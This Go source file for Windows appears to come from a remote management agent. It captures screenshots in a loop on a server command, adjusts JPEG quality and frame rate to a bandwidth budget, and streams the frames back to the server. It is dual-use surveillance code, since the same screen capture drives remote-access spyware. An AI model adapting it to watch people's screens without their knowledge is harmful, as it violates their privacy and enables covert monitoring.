//go:build windows && !light

package main

import (
	"encoding/json"
	"fmt"
	"sync/atomic"
	"time"
)

// ─── 实时屏幕流 ─────────────────────────────────────────────────────
// 复用截图模块的 GDI 捕获（handleScreenshot），按帧率循环截图并以
// TypeScreenFrame 帧回传服务端，服务端再推送到前端渲染。
//
// ROADMAP P0.2 起支持服务端下发参数，并按实测带宽自适应：
//
//	{"action":"start","fps":5,"quality":70,"max_kbps":1500,"monitor":1,"max_width":1600}
//
//   - fps       1-10（默认 2，历史固定值约 1.25fps）
//   - quality   JPEG 质量 20-95（默认 70）
//   - max_kbps  带宽上限（0 = 不限），超限自动降画质、再降帧率
//   - monitor   0=全部显示器拼接；N=第 N 个显示器
//   - max_width 缩放宽度（0 = 原始分辨率）
//
// 捕获失败不再静默重试：连续失败时立即回传带原因的 error 帧（锁屏/无交互
// 桌面/Headless），前端可直接提示运维，而不是只显示「等待画面」。

var (
	screenStreamStop   atomic.Bool
	screenStreamActive atomic.Bool
)

// screenStreamParams 运行参数（每轮读取，简化实现）。
type screenStreamParams struct {
	captureOptions
	FPS     int `json:"fps"`
	MaxKbps int `json:"max_kbps"`
}

func (p screenStreamParams) interval() time.Duration {
	fps := p.FPS
	if fps <= 0 {
		fps = 2
	}
	if fps > 10 {
		fps = 10
	}
	return time.Duration(1000/fps) * time.Millisecond
}

func (p screenStreamParams) jpegCap() int {
	q := p.Quality
	if q <= 0 {
		q = 70
	}
	if q > 95 {
		q = 95
	}
	return q
}

func parseScreenStreamParams(taskData string) screenStreamParams {
	p := screenStreamParams{}
	if taskData != "" {
		_ = json.Unmarshal([]byte(taskData), &p)
	}
	p.captureOptions = parseCaptureOptions(taskData)
	if p.FPS <= 0 || p.FPS > 10 {
		p.FPS = 2
	}
	if p.MaxKbps < 0 {
		p.MaxKbps = 0
	}
	// 屏幕流默认走 JPEG：PNG 帧在 1080p 下动辄数 MB，无法支撑实时观看
	if p.Format == "" || p.Format == "auto" {
		p.Format = "jpeg"
	}
	return p
}

func handleScreenStream(taskData string) (string, int32, string) {
	var req struct {
		Action string `json:"action"`
	}
	_ = json.Unmarshal([]byte(taskData), &req)

	switch req.Action {
	case "stop":
		screenStreamStop.Store(true)
		screenStreamActive.Store(false)
		return "screen stream stopped", 0, ""
	default: // start
		if screenStreamActive.Load() {
			return "screen stream already running", 0, ""
		}
		params := parseScreenStreamParams(taskData)
		screenStreamStop.Store(false)
		screenStreamActive.Store(true)
		go screenStreamLoop(params)
		return fmt.Sprintf("screen stream started (fps=%d quality=%d monitor=%d max_kbps=%d)",
			params.FPS, params.jpegCap(), params.Monitor, params.MaxKbps), 0, ""
	}
}

// screenStreamLoop 采集循环：固定节奏出帧，按带宽预算自适应画质/帧率。
func screenStreamLoop(base screenStreamParams) {
	defer screenStreamActive.Store(false)

	quality := base.jpegCap()
	interval := base.interval()
	tier := 0 // 0=原分辨率 1=降质 2=降质+降帧
	bytesWindow := 0
	windowStart := time.Now()
	lastErr := ""

	for !screenStreamStop.Load() {
		opts := base.captureOptions
		opts.Format = "jpeg"
		opts.Quality = quality
		if tier == 2 && opts.MaxWidth == 0 {
			// 第二档：限宽到 1280（原分辨率很小时保持原样）
			opts.MaxWidth = 1280
		}
		data, _ := json.Marshal(opts)

		out, code, errMsg := handleScreenshot(string(data))
		if code == 0 && out != "" {
			bytesWindow += len(out)
			lastErr = ""
			sendScreenFrame(out)
		} else {
			// 失败：立刻回传一次带原因的 error 帧（前端提示），随后继续重试
			if errMsg != lastErr {
				lastErr = errMsg
				sendScreenFrame(fmt.Sprintf(`{"error":%q}`, errMsg))
			}
		}

		// 每秒结算一次带宽预算并调整档位
		if elapsed := time.Since(windowStart); elapsed >= time.Second {
			kbps := bytesWindow * 8 / int(elapsed.Milliseconds())
			bytesWindow = 0
			windowStart = time.Now()
			if base.MaxKbps > 0 {
				switch {
				case kbps > base.MaxKbps && tier == 0:
					tier = 1
					quality = maxInt(40, quality-20)
				case kbps > base.MaxKbps && tier == 1:
					tier = 2
					quality = maxInt(35, quality-10)
					interval = interval * 2
				case kbps < base.MaxKbps*3/4 && tier > 0:
					// 带宽有余量：逐级恢复
					tier--
					quality = minInt(base.jpegCap(), quality+15)
					if tier < 2 {
						interval = base.interval()
					}
				}
			}
		}

		time.Sleep(interval)
	}
}

func sendScreenFrame(imageJSON string) {
	packet := &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeScreenFrame,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(imageJSON),
	}
	sendPacket(packet)
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
